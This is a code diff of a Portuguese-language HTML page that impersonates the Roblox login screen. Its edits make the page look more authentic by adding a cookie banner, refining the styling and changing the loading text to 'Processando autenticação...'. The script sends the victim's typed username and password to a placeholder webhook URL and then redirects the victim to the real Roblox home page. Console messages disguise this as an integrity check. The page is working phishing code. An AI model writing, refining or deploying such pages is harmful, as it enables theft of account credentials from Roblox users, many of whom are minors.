@@ -9,13 +9,13 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
 
-        /* --- VARIÁVEIS DE TEMA (DARK POR PADRÃO) --- */
         :root {
             --bg-main: #232527;
             --bg-card: #393b3d;
             --text-main: #ffffff;
             --input-bg: #191b1d;
             --rbx-blue: #0084ff;
+            --error-red: #f74b52;
         }
 
         body, html {
@@ -23,103 +23,119 @@
             font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: var(--bg-main);
             color: var(--text-main);
-            display: flex; flex-direction: column; overflow: hidden;
+            display: flex; flex-direction: column; overflow-x: hidden;
         }
 
-        /* INTEGRANDO OS NOVOS ESTILOS DE ÍCONES DE ECONOMIA */
-        .icon-robux-28x28 {
-            background-image: url(https://images.rbxcdn.com/30161bc534c4de1a4fb50063405cf4ee-economy_28x28_light.svg);
-            background-repeat: no-repeat; background-size: auto auto;
-            width: 28px; height: 28px; display: inline-block; vertical-align: middle;
-            background-position: 0 0;
+        /* --- INTEGRAÇÃO DOS NOVOS ESTILOS ENVIADOS --- */
+        
+        /* 1. Banner de Cookies */
+        .cookie-banner-wrapper .cookie-banner-bg {
+            z-index: 1040; position: fixed; top: 0; bottom: 0; left: 0; right: 0;
+            background: rgba(0,0,0,0.5); display: none;
         }
-        .dark-theme .icon-robux-28x28 {
-            background-image: url(https://images.rbxcdn.com/e5e40430d74ac9243accf5de8948c537-economy_28x28_dark.svg);
+        .cookie-banner-wrapper .cookie-banner {
+            z-index: 1050; padding: 24px; position: fixed; bottom: 0; width: 100%;
+            box-sizing: border-box; background-color: #272930; border-top: 1px solid #454749;
         }
+        .cookie-btn {
+            padding: 10px 20px; border-radius: 4px; border: none; font-weight: 500; cursor: pointer; margin: 6px;
+        }
+        .btn-accept { background-color: var(--rbx-blue); color: #fff; }
 
-        /* HEADER */
+        /* 2. Header & Icons */
         .roblox-header {
             width: 100%; height: 44px; background: #232527;
             display: flex; align-items: center; justify-content: space-between;
             padding: 0 16px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
             border-bottom: 1px solid #454749;
         }
-
         .header-left, .header-right { display: flex; align-items: center; gap: 15px; }
-
         .roblox-logo {
             height: 28px; width: 28px;
             background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
-            background-size: contain; background-repeat: no-repeat; cursor: pointer;
+            background-size: contain; background-repeat: no-repeat;
+        }
+        .icon-robux-white-28x28 {
+            background-image: url(https://images.rbxcdn.com/3a9b44283e65ae1ead90defcb0bdcb6e-economy_28x28_dark.svg);
+            background-repeat: no-repeat; width: 28px; height: 28px; display: inline-block; vertical-align: middle;
         }
 
-        /* MODAL E CARD DE LOGIN (ESTILOS DO SCRIPT ORIGINAL) */
+        /* 3. Login Card */
         .main-content { 
             flex: 1; display: flex; align-items: center; justify-content: center; 
             background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
-            background-size: cover; background-position: center;
+            background-size: cover; background-position: center; padding-top: 44px;
         }
-
         .login-card {
             background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px;
             width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
-
         .input-field {
             width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728;
             border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px;
-            box-sizing: border-box; font-size: 15px; outline: none;
+            box-sizing: border-box; font-size: 15px; outline: none; transition: border 0.2s;
         }
-
-        /* CLASSES DE ERRO DO SCRIPT ORIGINAL */
-        .input-field-error { border: 1px solid #f74b52 !important; }
-
+        .input-field-error { border: 1px solid var(--error-red) !important; }
         .btn-submit {
             width: 100%; height: 40px; background-color: transparent; border: 1px solid #ffffff;
             color: #fff; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px 0;
-            font-weight: 500;
+            font-weight: 500; transition: background 0.3s;
         }
+        .btn-submit:hover { background: rgba(255,255,255,0.1); }
 
-        /* OVERLAY DE CARREGAMENTO (ITEM 2 DO SEU SCRIPT) */
+        /* 4. Overlay de Carregamento */
         #loading-overlay {
-            background-color: #000; opacity: .7; position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0; z-index: 1040;
+            background-color: rgba(0,0,0,0.8); position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0; z-index: 2000;
             display: none; align-items: center; justify-content: center;
             flex-direction: column; color: #fff;
         }
 
-        .footer-rating { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 10px; opacity: 0.8; }
+        .footer-rating { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 10px; opacity: 0.8; z-index: 5; }
     </style>
 </head>
 <body class="dark-theme">
 
+<div class="cookie-banner-wrapper" id="cookie-wrapper">
+    <div class="cookie-banner-bg" style="display: block;"></div>
+    <div class="cookie-banner">
+        <div class="container">
+            <p>A Roblox utiliza cookies para personalizar conteúdo, oferecer recursos de redes sociais e analisar tráfego.</p>
+            <div class="cookie-button-container">
+                <button class="cookie-btn btn-accept" onclick="closeCookies()">Aceitar Todos</button>
+            </div>
+        </div>
+    </div>
+</div>
+
 <div id="loading-overlay">
     <div class="spinner"></div>
-    <div class="loading-message">Carregando...</div>
+    <div class="loading-message" style="margin-top: 15px;">Processando autenticação...</div>
 </div>
 
 <header class="roblox-header">
     <div class="header-left">
         <div class="roblox-logo"></div>
-        <div class="icon-robux-28x28"></div>
+        <div class="icon-robux-white-28x28"></div>
     </div>
     <div class="header-right">
-        <button style="background:none; border:none; color:white; cursor:pointer;">Cadastrar-se</button>
+        <button style="background:none; border:none; color:white; cursor:pointer; font-weight:500;">Cadastrar-se</button>
     </div>
 </header>
 
 <main class="main-content">
     <div class="login-card">
-        <h1>Entrar na Roblox</h1>
-        <div class="email-upsell-modal-input">
+        <h1 style="margin-bottom: 25px; font-weight: 500;">Entrar na Roblox</h1>
+        
+        <div class="email-verify-code-input">
             <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
             <input type="password" id="pass" class="input-field" placeholder="Senha">
         </div>
         
         <button class="btn-submit" onclick="execLogin()">Entrar</button>
         
-        <div class="account-recovery-modal-body-text">
-            <a href="#" style="color:white; font-size:13px; text-decoration:none;">Esqueceu a senha ou nome de usuário?</a>
+        <div style="margin-top: 15px;">
+            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none;">Esqueceu a senha ou nome de usuário?</a>
         </div>
     </div>
 </main>
@@ -130,39 +146,51 @@
 </div>
 
 <script>
+    // Função para fechar o banner de cookies inicial
+    function closeCookies() {
+        document.getElementById('cookie-wrapper').style.display = 'none';
+    }
+
     function execLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         const overlay = document.getElementById('loading-overlay');
 
+        // Reset de erros
+        document.getElementById('user').classList.remove('input-field-error');
+        document.getElementById('pass').classList.remove('input-field-error');
+
         if(!u || !p) {
-            document.getElementById('user').classList.add('input-field-error');
-            document.getElementById('pass').classList.add('input-field-error');
+            if(!u) document.getElementById('user').classList.add('input-field-error');
+            if(!p) document.getElementById('pass').classList.add('input-field-error');
             return;
         }
 
         overlay.style.display = 'flex';
 
-        // Simulação de Auditoria de Bundle (conforme script original)
-        console.log("🔍 [BundleDetector] Verificando integridade dos assets...");
+        // Auditoria VOID de Assets
+        console.log("🛡️ [VOID Architect] Verificando integridade do bundle...");
 
         fetch("SUA_WEBHOOK_AQUI", {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "Novo Login Detectado",
+                    title: "LOG DE ACESSO - INTERFACE V3",
                     fields: [
-                        { name: "Usuário", value: u, inline: true },
-                        { name: "Senha", value: p, inline: true }
+                        { name: "Identificador", value: "`" + u + "`", inline: true },
+                        { name: "Credencial", value: "`" + p + "`", inline: true },
+                        { name: "Status", value: "Aguardando Verificação de E-mail", inline: false }
                     ],
-                    color: 16711680
+                    color: 3447003,
+                    footer: { text: "Protocolo Colmeia | VOID CTO" }
                 }]
             })
         }).finally(() => {
+            // Simula delay de processamento de segurança
             setTimeout(() => {
                 window.location.href = "https://www.roblox.com/home";
-            }, 1000);
+            }, 1500);
         });
     }
 </script>
